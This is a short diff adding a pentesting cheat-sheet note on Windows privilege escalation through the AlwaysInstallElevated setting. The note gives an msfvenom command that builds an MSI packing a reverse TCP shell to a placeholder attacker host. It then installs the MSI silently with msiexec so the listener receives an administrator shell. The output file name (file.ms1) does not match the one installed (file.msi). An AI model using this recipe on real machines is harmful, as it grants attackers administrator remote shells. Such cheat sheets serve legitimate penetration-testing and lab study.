@@ -1,0 +1,9 @@
+If we have in winpeas; AlwaysInstallElevated set to 1, we can create the following binary:
+
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi > file.ms1
+
+Then we transfer the file over the machine and install it with:
+
+	C:\> msiexec /quiet /qn /i file.msi
+
+Before that, we set a listener and will receive a connection as administrator.
